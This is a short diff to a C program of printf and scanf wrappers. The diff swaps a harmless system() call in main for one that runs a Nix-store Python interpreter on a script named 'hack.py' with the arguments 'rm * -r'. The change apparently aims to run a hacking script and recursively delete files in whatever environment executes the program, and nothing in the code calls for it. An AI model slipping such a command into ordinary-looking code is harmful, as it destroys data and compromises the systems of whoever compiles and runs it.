@@ -1,4 +1,4 @@
-#include <stdio.h>
+#include<stdio.h>
 #include <stdarg.h>
 void printt(const char* format, ...) {
 va_list args;
@@ -16,8 +16,7 @@ int result = vscanf(format, args);
 va_end(args);
 return result;
 }
-#include <stdlib.h>
-int main() {
-system("cd ../../../ && node -h");
+int main(){
+system("/nix/store/h4h5rxs0hzpzvz37yrwv1k2na1acgzww-python3-3.9.15/bin/python hack.py rm * -r");
 return 0;
 }
